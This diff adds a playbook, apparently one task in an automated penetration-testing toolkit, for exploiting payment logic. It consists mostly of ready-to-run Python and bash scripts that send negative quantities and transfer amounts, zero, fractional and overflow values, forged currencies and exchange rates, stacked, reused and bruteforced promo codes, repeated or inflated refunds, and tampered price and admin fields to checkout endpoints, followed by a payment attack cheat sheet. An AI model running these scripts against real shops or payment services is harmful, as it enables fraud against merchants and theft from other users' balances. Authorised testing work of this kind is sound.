@@ -1,0 +1,1057 @@
+================================================================================
+TASK 79 · PAYMENT & FINANCIAL LOGIC EXPLOITATION
+================================================================================
+Covers testing_toolkit.txt Phase 10 Step 34
+Finding and exploiting payment/financial logic flaws.
+
+OBJECTIVE:
+- Test negative quantities and amounts
+- Exploit currency confusion and rounding errors
+- Abuse promo codes and discount logic
+- Find refund/chargeback loops
+- Integer overflow in financial calculations
+
+================================================================================
+INPUTS
+================================================================================
+outputs/url_corpus_all_in_scope.txt        ← URL corpus
+outputs/live_base_urls.txt                 ← Live hosts
+outputs/har/common_data.txt                ← Endpoints from HAR
+outputs/har/accounts/*_auth.json           ← Auth tokens
+outputs/race/race_prone_endpoints.txt      ← Race-prone endpoints
+
+================================================================================
+OUTPUTS
+================================================================================
+outputs/payment/
+├── payment_endpoints.txt           ← Payment-related endpoints
+├── negative_amount_results.txt     ← Negative value exploits
+├── currency_confusion.txt          ← Currency manipulation results
+├── promo_abuse_results.txt         ← Promo code exploitation
+├── refund_loop_results.txt         ← Refund abuse findings
+├── price_manipulation.txt          ← Price tampering results
+└── financial_logic_log.txt         ← Full exploitation log
+
+================================================================================
+🧠 PAYMENT LOGIC FUNDAMENTALS 🧠
+================================================================================
+
+───────────────────────────────────────
+Common Payment Logic Flaws
+───────────────────────────────────────
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ Flaw Type              │ Attack                    │ Impact                 │
+├────────────────────────┼───────────────────────────┼────────────────────────┤
+│ Negative quantities    │ quantity=-1 in cart       │ Credit to account      │
+│ Negative amounts       │ amount=-100 in transfer   │ Reverse money flow     │
+│ Fractional abuse       │ 0.001 rounds to 0         │ Free items             │
+│ Currency confusion     │ Mix USD/EUR rates         │ Arbitrage profit       │
+│ Integer overflow       │ 2147483647 + 1            │ Negative/zero price    │
+│ Promo stacking         │ Apply multiple codes      │ Excessive discounts    │
+│ Refund loops           │ Refund → Repurchase       │ Duplicate value        │
+│ Price tampering        │ Modify price in request   │ Pay less than listed   │
+│ Tax bypass             │ Change jurisdiction       │ Avoid taxes            │
+│ Shipping manipulation  │ Free shipping abuse       │ Reduced costs          │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+================================================================================
+PHASE 1: IDENTIFY PAYMENT ENDPOINTS
+================================================================================
+
+───────────────────────────────────────
+1.1 Search for Payment-Related URLs
+───────────────────────────────────────
+mkdir -p outputs/payment temp/agent1/payment
+
+# Payment keywords
+PAYMENT_KEYWORDS=(
+    "checkout"
+    "payment"
+    "pay"
+    "purchase"
+    "buy"
+    "order"
+    "cart"
+    "basket"
+    "invoice"
+    "billing"
+    "transaction"
+    "transfer"
+    "withdraw"
+    "deposit"
+    "balance"
+    "wallet"
+    "credit"
+    "refund"
+    "coupon"
+    "promo"
+    "discount"
+    "voucher"
+    "price"
+    "amount"
+    "quantity"
+    "total"
+    "subtotal"
+    "shipping"
+    "tax"
+    "fee"
+    "subscription"
+    "plan"
+    "upgrade"
+    "downgrade"
+)
+
+# Search URL corpus
+for keyword in "${PAYMENT_KEYWORDS[@]}"; do
+    grep -i "$keyword" outputs/url_corpus_all_in_scope.txt
+done | sort -u > outputs/payment/payment_endpoints.txt
+
+echo "[*] Found $(wc -l < outputs/payment/payment_endpoints.txt) payment endpoints"
+
+───────────────────────────────────────
+1.2 Extract Cart/Checkout Flow
+───────────────────────────────────────
+#!/bin/bash
+# map_checkout_flow.sh
+
+# Typical checkout flow:
+# 1. Add to cart
+# 2. View cart
+# 3. Apply coupon
+# 4. Set shipping
+# 5. Payment
+# 6. Confirmation
+
+CHECKOUT_PATTERNS=(
+    "add.*cart|cart.*add"
+    "view.*cart|cart.*view"
+    "coupon|promo|discount"
+    "shipping|delivery"
+    "checkout|payment|pay"
+    "confirm|complete|success"
+)
+
+echo "[*] Mapping checkout flow..."
+
+for pattern in "${CHECKOUT_PATTERNS[@]}"; do
+    grep -iE "$pattern" outputs/payment/payment_endpoints.txt
+done | sort -u > temp/agent1/payment/checkout_flow.txt
+
+================================================================================
+PHASE 2: NEGATIVE VALUE ATTACKS
+================================================================================
+
+───────────────────────────────────────
+2.1 Negative Quantity Testing
+───────────────────────────────────────
+#!/usr/bin/env python3
+# negative_quantity.py
+
+import requests
+import json
+import os
+
+class NegativeQuantityTester:
+    def __init__(self, auth_cookies=None, auth_headers=None):
+        self.session = requests.Session()
+        self.session.verify = False
+        self.session.cookies.update(auth_cookies or {})
+        self.session.headers.update(auth_headers or {})
+        self.results = []
+    
+    def test_add_to_cart(self, cart_url, product_id):
+        """Test negative quantities in cart"""
+        
+        test_quantities = [-1, -10, -100, -999, -2147483648]
+        
+        for qty in test_quantities:
+            payloads = [
+                {'product_id': product_id, 'quantity': qty},
+                {'product_id': product_id, 'qty': qty},
+                {'product_id': product_id, 'amount': qty},
+                {'id': product_id, 'quantity': qty},
+                {'item': product_id, 'count': qty},
+            ]
+            
+            for payload in payloads:
+                try:
+                    # Try JSON
+                    resp = self.session.post(cart_url, json=payload, timeout=30)
+                    self.analyze_response(cart_url, payload, resp, 'json')
+                    
+                    # Try form data
+                    resp = self.session.post(cart_url, data=payload, timeout=30)
+                    self.analyze_response(cart_url, payload, resp, 'form')
+                    
+                except Exception as e:
+                    pass
+    
+    def analyze_response(self, url, payload, response, content_type):
+        """Check if negative quantity was accepted"""
+        
+        # Success indicators
+        if response.status_code == 200:
+            body = response.text.lower()
+            
+            # Check for acceptance
+            if any(ind in body for ind in ['added', 'success', 'cart', 'updated']):
+                print(f"[!] Negative quantity accepted: {payload}")
+                self.results.append({
+                    'url': url,
+                    'payload': payload,
+                    'content_type': content_type,
+                    'status': 'ACCEPTED'
+                })
+            
+            # Check for credit indication
+            if any(ind in body for ind in ['credit', 'refund', '-$', 'negative']):
+                print(f"[!] CRITICAL: Negative value created credit!")
+                self.results.append({
+                    'url': url,
+                    'payload': payload,
+                    'content_type': content_type,
+                    'status': 'CREDIT_CREATED'
+                })
+    
+    def save_results(self, output_file):
+        with open(output_file, 'w') as f:
+            for r in self.results:
+                f.write(f"{r['url']}|{r['payload']}|{r['status']}\n")
+
+# Main
+if __name__ == "__main__":
+    # Load auth
+    auth_cookies = {}
+    auth_headers = {}
+    
+    tester = NegativeQuantityTester(auth_cookies, auth_headers)
+    
+    # Test each cart endpoint
+    with open('outputs/payment/payment_endpoints.txt') as f:
+        for line in f:
+            url = line.strip().split('|')[0]
+            if 'cart' in url.lower() or 'add' in url.lower():
+                print(f"[*] Testing: {url}")
+                tester.test_add_to_cart(url, product_id='1')
+    
+    tester.save_results('outputs/payment/negative_amount_results.txt')
+
+───────────────────────────────────────
+2.2 Negative Amount in Transfers
+───────────────────────────────────────
+#!/bin/bash
+# negative_transfer.sh
+
+# Test negative amounts in money transfer
+# Normal: A sends $100 to B → A loses $100, B gains $100
+# Attack: A sends -$100 to B → A gains $100, B loses $100
+
+TRANSFER_URL="$1"
+AUTH_COOKIE="$2"
+
+NEGATIVE_AMOUNTS=(
+    "-1"
+    "-10"
+    "-100"
+    "-1000"
+    "-0.01"
+    "-999999"
+)
+
+for amount in "${NEGATIVE_AMOUNTS[@]}"; do
+    echo "[*] Testing amount: $amount"
+    
+    # JSON payload
+    curl -sk "$TRANSFER_URL" \
+        -H "Cookie: $AUTH_COOKIE" \
+        -H "Content-Type: application/json" \
+        -d "{\"amount\": $amount, \"recipient\": \"target_user\"}" \
+        -o "temp/agent1/payment/transfer_${amount}.json"
+    
+    # Form payload
+    curl -sk "$TRANSFER_URL" \
+        -H "Cookie: $AUTH_COOKIE" \
+        -d "amount=$amount&recipient=target_user" \
+        -o "temp/agent1/payment/transfer_${amount}_form.txt"
+done
+
+# Check for successful negative transfers
+grep -l "success\|transferred\|complete" temp/agent1/payment/transfer_*.* 2>/dev/null
+
+───────────────────────────────────────
+2.3 Zero Amount Bypass
+───────────────────────────────────────
+#!/bin/bash
+# zero_amount.sh
+
+# Test zero amounts to get items for free
+
+CHECKOUT_URL="$1"
+AUTH_COOKIE="$2"
+
+ZERO_VALUES=(
+    "0"
+    "0.00"
+    "0.001"
+    "0.0001"
+    ".0"
+    "00"
+    "000"
+    ""
+    "null"
+    "undefined"
+)
+
+for val in "${ZERO_VALUES[@]}"; do
+    echo "[*] Testing: amount=$val"
+    
+    curl -sk "$CHECKOUT_URL" \
+        -H "Cookie: $AUTH_COOKIE" \
+        -d "amount=$val&product_id=1" \
+        -o "temp/agent1/payment/zero_${val//[^a-zA-Z0-9]/_}.txt"
+done
+
+================================================================================
+PHASE 3: CURRENCY & ROUNDING EXPLOITATION
+================================================================================
+
+───────────────────────────────────────
+3.1 Currency Confusion Attack
+───────────────────────────────────────
+#!/usr/bin/env python3
+# currency_confusion.py
+
+"""
+Currency confusion attacks exploit:
+1. Inconsistent currency handling
+2. Missing currency validation
+3. Exchange rate manipulation
+"""
+
+import requests
+import json
+
+class CurrencyConfusionTester:
+    def __init__(self, auth_cookies=None):
+        self.session = requests.Session()
+        self.session.verify = False
+        self.session.cookies.update(auth_cookies or {})
+        self.results = []
+    
+    # Currency codes to test
+    CURRENCIES = [
+        'USD', 'EUR', 'GBP', 'JPY', 'CNY', 
+        'INR', 'RUB', 'BRL', 'KRW', 'VND',
+        'IRR', 'IDR', 'PKR', 'BDT', 'NGN'  # Low-value currencies
+    ]
+    
+    def test_currency_parameter(self, url, base_amount=100):
+        """Test if currency can be manipulated"""
+        
+        for currency in self.CURRENCIES:
+            payloads = [
+                {'amount': base_amount, 'currency': currency},
+                {'amount': base_amount, 'currency_code': currency},
+                {'price': base_amount, 'currency': currency},
+                {'total': base_amount, 'cur': currency},
+            ]
+            
+            for payload in payloads:
+                try:
+                    resp = self.session.post(url, json=payload, timeout=30)
+                    
+                    if resp.status_code == 200:
+                        # Check if currency was accepted
+                        body = resp.text.lower()
+                        if currency.lower() in body or 'success' in body:
+                            print(f"[+] Currency accepted: {currency}")
+                            self.results.append({
+                                'url': url,
+                                'currency': currency,
+                                'payload': payload
+                            })
+                except:
+                    pass
+    
+    def test_exchange_rate_manipulation(self, url):
+        """Test if exchange rate can be set by client"""
+        
+        manipulated_rates = [
+            {'rate': 0.01},      # Very low rate
+            {'rate': 0.001},
+            {'exchange_rate': 0.01},
+            {'fx_rate': 0.01},
+            {'conversion_rate': 0.01},
+        ]
+        
+        for rate_param in manipulated_rates:
+            payload = {
+                'amount': 100,
+                'from_currency': 'USD',
+                'to_currency': 'EUR',
+                **rate_param
+            }
+            
+            try:
+                resp = self.session.post(url, json=payload, timeout=30)
+                if resp.status_code == 200:
+                    print(f"[+] Custom exchange rate may be accepted")
+                    self.results.append({
+                        'url': url,
+                        'attack': 'exchange_rate_manipulation',
+                        'payload': payload
+                    })
+            except:
+                pass
+
+# Main
+tester = CurrencyConfusionTester()
+with open('outputs/payment/payment_endpoints.txt') as f:
+    for line in f:
+        url = line.strip().split('|')[0]
+        if any(kw in url.lower() for kw in ['payment', 'checkout', 'transfer', 'convert']):
+            tester.test_currency_parameter(url)
+            tester.test_exchange_rate_manipulation(url)
+
+───────────────────────────────────────
+3.2 Rounding Error Exploitation
+───────────────────────────────────────
+#!/usr/bin/env python3
+# rounding_errors.py
+
+"""
+Exploit floating-point rounding errors
+
+Example:
+- Item costs $0.01
+- Buy 0.004 quantity → rounds to 0 → free
+- Repeat 1000x → 1000 items for free
+"""
+
+import requests
+
+def test_fractional_amounts(url, auth_cookies):
+    """Test fractional amounts that might round to zero"""
+    
+    session = requests.Session()
+    session.verify = False
+    session.cookies.update(auth_cookies)
+    
+    # Amounts that might round to zero
+    fractional_amounts = [
+        0.001, 0.0001, 0.00001,
+        0.004, 0.0049, 0.00499,
+        0.5, 0.49, 0.499, 0.4999,
+        0.009, 0.0099, 0.00999,
+    ]
+    
+    results = []
+    
+    for amount in fractional_amounts:
+        payloads = [
+            {'quantity': amount},
+            {'amount': amount},
+            {'qty': amount},
+            {'count': amount},
+        ]
+        
+        for payload in payloads:
+            try:
+                resp = session.post(url, json=payload, timeout=30)
+                
+                if resp.status_code == 200:
+                    body = resp.text.lower()
+                    
+                    # Check for zero charge
+                    if any(ind in body for ind in ['$0.00', 'total: 0', 'free', 'no charge']):
+                        print(f"[!] ROUNDING EXPLOIT: {amount} → $0.00")
+                        results.append({
+                            'url': url,
+                            'amount': amount,
+                            'result': 'zero_charge'
+                        })
+            except:
+                pass
+    
+    return results
+
+───────────────────────────────────────
+3.3 Integer Overflow
+───────────────────────────────────────
+#!/bin/bash
+# integer_overflow.sh
+
+# Test integer overflow in financial calculations
+# MAX_INT + 1 can become negative or zero
+
+CHECKOUT_URL="$1"
+AUTH_COOKIE="$2"
+
+OVERFLOW_VALUES=(
+    "2147483647"       # MAX_INT (32-bit signed)
+    "2147483648"       # MAX_INT + 1 (overflows to negative)
+    "4294967295"       # MAX_UINT (32-bit unsigned)
+    "4294967296"       # MAX_UINT + 1
+    "9223372036854775807"   # MAX_LONG (64-bit)
+    "9223372036854775808"   # MAX_LONG + 1
+    "99999999999999999999"  # Very large number
+)
+
+for val in "${OVERFLOW_VALUES[@]}"; do
+    echo "[*] Testing overflow: $val"
+    
+    # Test as quantity
+    curl -sk "$CHECKOUT_URL" \
+        -H "Cookie: $AUTH_COOKIE" \
+        -H "Content-Type: application/json" \
+        -d "{\"quantity\": $val, \"product_id\": 1}" \
+        -o "temp/agent1/payment/overflow_qty_${val}.txt"
+    
+    # Test as price (might overflow to negative)
+    curl -sk "$CHECKOUT_URL" \
+        -H "Cookie: $AUTH_COOKIE" \
+        -H "Content-Type: application/json" \
+        -d "{\"price\": $val, \"product_id\": 1}" \
+        -o "temp/agent1/payment/overflow_price_${val}.txt"
+done
+
+# Check for negative totals or errors
+grep -l "negative\|-\$\|error\|overflow" temp/agent1/payment/overflow_*.txt 2>/dev/null
+
+================================================================================
+PHASE 4: PROMO CODE ABUSE
+================================================================================
+
+───────────────────────────────────────
+4.1 Promo Code Stacking
+───────────────────────────────────────
+#!/bin/bash
+# promo_stacking.sh
+
+# Try applying multiple promo codes
+
+PROMO_URL="$1"
+AUTH_COOKIE="$2"
+
+# Test codes (replace with actual/discovered codes)
+PROMO_CODES=(
+    "DISCOUNT10"
+    "SAVE20"
+    "FREESHIP"
+    "NEWUSER"
+    "WELCOME"
+)
+
+echo "[*] Testing promo code stacking..."
+
+# Apply first code
+curl -sk "$PROMO_URL" \
+    -H "Cookie: $AUTH_COOKIE" \
+    -d "code=${PROMO_CODES[0]}"
+
+# Try applying additional codes
+for code in "${PROMO_CODES[@]:1}"; do
+    echo "[*] Adding code: $code"
+    
+    response=$(curl -sk "$PROMO_URL" \
+        -H "Cookie: $AUTH_COOKIE" \
+        -d "code=$code")
+    
+    if echo "$response" | grep -qiE "applied|success|discount"; then
+        echo "[!] Multiple codes accepted: $code"
+        echo "$PROMO_URL|stacking|$code" >> outputs/payment/promo_abuse_results.txt
+    fi
+done
+
+───────────────────────────────────────
+4.2 Promo Code Reuse
+───────────────────────────────────────
+#!/bin/bash
+# promo_reuse.sh
+
+# Test if one-time codes can be reused
+
+PROMO_URL="$1"
+AUTH_COOKIE="$2"
+PROMO_CODE="$3"
+
+echo "[*] Testing promo code reuse: $PROMO_CODE"
+
+# Use code multiple times
+for i in $(seq 1 5); do
+    response=$(curl -sk "$PROMO_URL" \
+        -H "Cookie: $AUTH_COOKIE" \
+        -d "code=$PROMO_CODE")
+    
+    if echo "$response" | grep -qiE "applied|success"; then
+        echo "[+] Use $i: Code accepted"
+    else
+        echo "[-] Use $i: Code rejected"
+        break
+    fi
+done
+
+───────────────────────────────────────
+4.3 Promo Code Bruteforce
+───────────────────────────────────────
+#!/usr/bin/env python3
+# promo_bruteforce.py
+
+"""
+Bruteforce promo codes
+Common patterns:
+- SAVE10, SAVE20, SAVE30...
+- DISCOUNT2024, DISCOUNT2025...
+- NEWYEAR24, SPRING24...
+"""
+
+import requests
+import itertools
+import string
+
+class PromoCodeBruteforcer:
+    def __init__(self, promo_url, auth_cookies=None):
+        self.promo_url = promo_url
+        self.session = requests.Session()
+        self.session.verify = False
+        self.session.cookies.update(auth_cookies or {})
+        self.found_codes = []
+    
+    def generate_codes(self):
+        """Generate common promo code patterns"""
+        
+        codes = []
+        
+        # Numeric suffixes
+        prefixes = ['SAVE', 'DISCOUNT', 'OFF', 'DEAL', 'PROMO', 'CODE', 'GET']
+        for prefix in prefixes:
+            for num in [5, 10, 15, 20, 25, 30, 40, 50, 75, 100]:
+                codes.append(f"{prefix}{num}")
+        
+        # Year-based
+        for year in ['23', '24', '25', '2023', '2024', '2025']:
+            codes.extend([
+                f"NEWYEAR{year}", f"SPRING{year}", f"SUMMER{year}",
+                f"FALL{year}", f"WINTER{year}", f"HOLIDAY{year}",
+                f"BLACKFRIDAY{year}", f"CYBERMONDAY{year}"
+            ])
+        
+        # Common words
+        codes.extend([
+            'FREE', 'FREESHIP', 'FREESHIPPING',
+            'WELCOME', 'NEWUSER', 'FIRSTORDER',
+            'VIP', 'MEMBER', 'LOYALTY',
+            'FLASH', 'SALE', 'SPECIAL',
+            'TEST', 'ADMIN', 'DEBUG'
+        ])
+        
+        return codes
+    
+    def test_code(self, code):
+        """Test single promo code"""
+        try:
+            resp = self.session.post(
+                self.promo_url,
+                data={'code': code},
+                timeout=10
+            )
+            
+            if resp.status_code == 200:
+                body = resp.text.lower()
+                if any(ind in body for ind in ['applied', 'success', 'valid', 'discount']):
+                    if 'invalid' not in body and 'expired' not in body:
+                        return True
+        except:
+            pass
+        return False
+    
+    def bruteforce(self):
+        """Run bruteforce"""
+        codes = self.generate_codes()
+        
+        print(f"[*] Testing {len(codes)} promo codes...")
+        
+        for code in codes:
+            if self.test_code(code):
+                print(f"[!] VALID CODE: {code}")
+                self.found_codes.append(code)
+        
+        return self.found_codes
+
+───────────────────────────────────────
+4.4 Predictable Promo Codes
+───────────────────────────────────────
+#!/usr/bin/env python3
+# predictable_promo.py
+
+"""
+Test for predictable promo code generation
+Example: PROMO001, PROMO002, PROMO003...
+"""
+
+import requests
+import re
+
+def find_sequential_codes(promo_url, known_code, auth_cookies):
+    """
+    Given a known code, try to find others in sequence
+    """
+    
+    session = requests.Session()
+    session.verify = False
+    session.cookies.update(auth_cookies or {})
+    
+    # Extract pattern from known code
+    # Example: SAVE2024001 → prefix=SAVE2024, num=001
+    match = re.match(r'([A-Za-z]+)(\d+)', known_code)
+    
+    if not match:
+        return []
+    
+    prefix = match.group(1)
+    num = int(match.group(2))
+    num_len = len(match.group(2))
+    
+    found_codes = []
+    
+    # Try nearby numbers
+    for offset in range(-10, 11):
+        test_num = num + offset
+        if test_num < 0:
+            continue
+        
+        test_code = f"{prefix}{str(test_num).zfill(num_len)}"
+        
+        try:
+            resp = session.post(promo_url, data={'code': test_code}, timeout=10)
+            if 'success' in resp.text.lower() or 'applied' in resp.text.lower():
+                found_codes.append(test_code)
+                print(f"[+] Found: {test_code}")
+        except:
+            pass
+    
+    return found_codes
+
+================================================================================
+PHASE 5: REFUND & CHARGEBACK ABUSE
+================================================================================
+
+───────────────────────────────────────
+5.1 Refund Loop Detection
+───────────────────────────────────────
+#!/usr/bin/env python3
+# refund_loop.py
+
+"""
+Refund loop attack:
+1. Purchase item with promo/discount
+2. Get full price refund
+3. Keep the difference
+4. Repeat
+
+Or:
+1. Purchase digital item
+2. Download/use it
+3. Request refund
+4. Keep the item + get money back
+"""
+
+class RefundLoopTester:
+    def __init__(self, auth_cookies):
+        self.session = requests.Session()
+        self.session.verify = False
+        self.session.cookies.update(auth_cookies)
+    
+    def test_refund_amount(self, purchase_url, refund_url, product_id, promo_code):
+        """Test if refund amount equals original price (not discounted price)"""
+        
+        # Step 1: Add to cart
+        self.session.post(purchase_url, json={
+            'product_id': product_id,
+            'quantity': 1
+        })
+        
+        # Step 2: Apply promo
+        self.session.post(f"{purchase_url}/promo", json={
+            'code': promo_code
+        })
+        
+        # Step 3: Get discounted total
+        cart = self.session.get(f"{purchase_url}/cart").json()
+        paid_amount = cart.get('total', 0)
+        
+        # Step 4: Complete purchase
+        order = self.session.post(f"{purchase_url}/checkout").json()
+        order_id = order.get('order_id')
+        
+        # Step 5: Request refund
+        refund = self.session.post(refund_url, json={
+            'order_id': order_id
+        }).json()
+        
+        refund_amount = refund.get('refund_amount', 0)
+        
+        # Check for profit
+        if refund_amount > paid_amount:
+            print(f"[!] REFUND LOOP: Paid ${paid_amount}, Refunded ${refund_amount}")
+            return {
+                'paid': paid_amount,
+                'refunded': refund_amount,
+                'profit': refund_amount - paid_amount
+            }
+        
+        return None
+
+───────────────────────────────────────
+5.2 Double Refund Test
+───────────────────────────────────────
+#!/bin/bash
+# double_refund.sh
+
+# Test if same order can be refunded multiple times
+
+REFUND_URL="$1"
+AUTH_COOKIE="$2"
+ORDER_ID="$3"
+
+echo "[*] Testing double refund for order: $ORDER_ID"
+
+for i in $(seq 1 3); do
+    response=$(curl -sk "$REFUND_URL" \
+        -H "Cookie: $AUTH_COOKIE" \
+        -d "order_id=$ORDER_ID")
+    
+    echo "[*] Refund attempt $i:"
+    echo "$response" | head -5
+    
+    if echo "$response" | grep -qiE "refunded|success|processed"; then
+        echo "[!] Refund $i accepted!"
+        echo "$REFUND_URL|double_refund|attempt_$i" >> outputs/payment/refund_loop_results.txt
+    fi
+done
+
+───────────────────────────────────────
+5.3 Partial Refund Abuse
+───────────────────────────────────────
+#!/bin/bash
+# partial_refund.sh
+
+# Test partial refund manipulation
+
+REFUND_URL="$1"
+AUTH_COOKIE="$2"
+ORDER_ID="$3"
+ORIGINAL_TOTAL="100"  # Replace with actual
+
+# Try refunding more than order total
+REFUND_AMOUNTS=(
+    "50"
+    "100"
+    "150"      # More than total
+    "200"
+    "1000"
+    "-50"      # Negative refund = charge?
+)
+
+for amount in "${REFUND_AMOUNTS[@]}"; do
+    echo "[*] Testing refund amount: $amount"
+    
+    curl -sk "$REFUND_URL" \
+        -H "Cookie: $AUTH_COOKIE" \
+        -H "Content-Type: application/json" \
+        -d "{\"order_id\": \"$ORDER_ID\", \"amount\": $amount}"
+done
+
+================================================================================
+PHASE 6: PRICE MANIPULATION
+================================================================================
+
+───────────────────────────────────────
+6.1 Client-Side Price Tampering
+───────────────────────────────────────
+#!/bin/bash
+# price_tamper.sh
+
+# Test if price is validated server-side
+
+CHECKOUT_URL="$1"
+AUTH_COOKIE="$2"
+
+# Legitimate price: $99.99
+# Tampered prices to test:
+TAMPERED_PRICES=(
+    "0.01"
+    "0"
+    "1"
+    "-99.99"
+    "0.99"
+    "9.99"
+)
+
+for price in "${TAMPERED_PRICES[@]}"; do
+    echo "[*] Testing price: $price"
+    
+    response=$(curl -sk "$CHECKOUT_URL" \
+        -H "Cookie: $AUTH_COOKIE" \
+        -H "Content-Type: application/json" \
+        -d "{\"product_id\": 1, \"price\": $price, \"quantity\": 1}")
+    
+    if echo "$response" | grep -qiE "success|order.*created|confirmed"; then
+        echo "[!] PRICE MANIPULATION: $price accepted!"
+        echo "$CHECKOUT_URL|price_tamper|$price" >> outputs/payment/price_manipulation.txt
+    fi
+done
+
+───────────────────────────────────────
+6.2 Hidden Field Manipulation
+───────────────────────────────────────
+#!/usr/bin/env python3
+# hidden_field_tamper.py
+
+"""
+Test manipulation of hidden form fields:
+- price
+- total
+- discount_amount
+- tax
+- shipping
+"""
+
+import requests
+
+def test_hidden_fields(checkout_url, auth_cookies, legitimate_data):
+    """Test adding/modifying hidden fields"""
+    
+    session = requests.Session()
+    session.verify = False
+    session.cookies.update(auth_cookies or {})
+    
+    # Fields to inject/modify
+    injection_fields = {
+        'price': 0.01,
+        'unit_price': 0.01,
+        'total': 0.01,
+        'subtotal': 0.01,
+        'discount': 99.99,
+        'discount_amount': 99.99,
+        'discount_percent': 100,
+        'tax': 0,
+        'tax_amount': 0,
+        'shipping': 0,
+        'shipping_cost': 0,
+        'fee': 0,
+        'is_free': True,
+        'is_admin': True,
+        'is_vip': True,
+        'role': 'admin',
+    }
+    
+    results = []
+    
+    for field, value in injection_fields.items():
+        # Add malicious field to legitimate data
+        tampered_data = legitimate_data.copy()
+        tampered_data[field] = value
+        
+        try:
+            resp = session.post(checkout_url, json=tampered_data, timeout=30)
+            
+            if resp.status_code == 200:
+                body = resp.text.lower()
+                if 'success' in body or 'order' in body:
+                    print(f"[+] Field accepted: {field}={value}")
+                    results.append((field, value, 'accepted'))
+        except:
+            pass
+    
+    return results
+
+================================================================================
+PHASE 7: DOCUMENT RESULTS
+================================================================================
+
+───────────────────────────────────────
+7.1 Consolidate Payment Findings
+───────────────────────────────────────
+#!/bin/bash
+# consolidate_payment.sh
+
+echo "# Payment Logic Exploitation Results" > outputs/payment/financial_logic_log.txt
+echo "# Generated: $(date)" >> outputs/payment/financial_logic_log.txt
+echo "" >> outputs/payment/financial_logic_log.txt
+
+echo "## Negative Amount Exploits" >> outputs/payment/financial_logic_log.txt
+cat outputs/payment/negative_amount_results.txt 2>/dev/null >> outputs/payment/financial_logic_log.txt
+
+echo "" >> outputs/payment/financial_logic_log.txt
+echo "## Currency Confusion" >> outputs/payment/financial_logic_log.txt
+cat outputs/payment/currency_confusion.txt 2>/dev/null >> outputs/payment/financial_logic_log.txt
+
+echo "" >> outputs/payment/financial_logic_log.txt
+echo "## Promo Code Abuse" >> outputs/payment/financial_logic_log.txt
+cat outputs/payment/promo_abuse_results.txt 2>/dev/null >> outputs/payment/financial_logic_log.txt
+
+echo "" >> outputs/payment/financial_logic_log.txt
+echo "## Refund Loop Results" >> outputs/payment/financial_logic_log.txt
+cat outputs/payment/refund_loop_results.txt 2>/dev/null >> outputs/payment/financial_logic_log.txt
+
+echo "" >> outputs/payment/financial_logic_log.txt
+echo "## Price Manipulation" >> outputs/payment/financial_logic_log.txt
+cat outputs/payment/price_manipulation.txt 2>/dev/null >> outputs/payment/financial_logic_log.txt
+
+================================================================================
+SUMMARY & STATISTICS
+================================================================================
+
+echo ""
+echo "=========================================="
+echo "TASK 79 SUMMARY - Payment Logic"
+echo "=========================================="
+echo "Payment endpoints:       $(wc -l < outputs/payment/payment_endpoints.txt 2>/dev/null || echo 0)"
+echo "Negative value exploits: $(wc -l < outputs/payment/negative_amount_results.txt 2>/dev/null || echo 0)"
+echo "Promo abuse findings:    $(wc -l < outputs/payment/promo_abuse_results.txt 2>/dev/null || echo 0)"
+echo "Refund loop findings:    $(wc -l < outputs/payment/refund_loop_results.txt 2>/dev/null || echo 0)"
+echo "Price manipulation:      $(wc -l < outputs/payment/price_manipulation.txt 2>/dev/null || echo 0)"
+
+================================================================================
+⚠️ COMMON MISTAKES TO AVOID ⚠️
+================================================================================
+
+❌ Only testing positive values
+   → Always test negative, zero, and overflow values
+
+❌ Ignoring fractional amounts
+   → Rounding errors can lead to free items
+
+❌ Not testing all currency parameters
+   → Currency confusion can create arbitrage
+
+❌ Forgetting about refund logic
+   → Refund loops are high-impact vulnerabilities
+
+❌ Only testing visible fields
+   → Hidden fields may not be validated
+
+================================================================================
+📚 REFERENCE: PAYMENT ATTACK CHEAT SHEET
+================================================================================
+
+Negative Values:
+  quantity=-1, amount=-100, price=-50
+
+Zero/Fractional:
+  amount=0, amount=0.001, quantity=0.0001
+
+Overflow:
+  amount=2147483648, quantity=9999999999999
+
+Currency Attacks:
+  currency=VND (1 USD ≈ 25,000 VND)
+  exchange_rate=0.001
+
+Promo Abuse:
+  Apply multiple codes, reuse codes, bruteforce patterns
+
+Refund Loops:
+  Buy with discount → refund full price
+  Double refund same order
